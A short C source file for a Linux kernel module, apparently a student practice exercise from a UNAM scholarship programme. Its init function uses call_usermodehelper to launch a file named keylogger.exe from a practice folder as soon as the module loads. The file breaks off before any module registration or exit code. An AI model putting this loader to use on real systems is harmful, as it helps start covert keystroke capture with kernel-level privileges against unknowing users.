//UNAM-Becarios
//Leal Gonzalez Ignacio
//Modulo de kernel

#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/init.h>

#define RUTA "/home/usuario1/Documents/Practicas/keylogger.exe"//Ruta del archivo ejecutable keylogger


static int externo(void)
{
	char *argv[]={RUTA,NULL};
	static char
	*envp[]={"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
	return call_usermodehelper(argv[0],argv,envp,UMH_WAIT_PROC);
}
static int __init x_x(void)
{
	return externo();
}
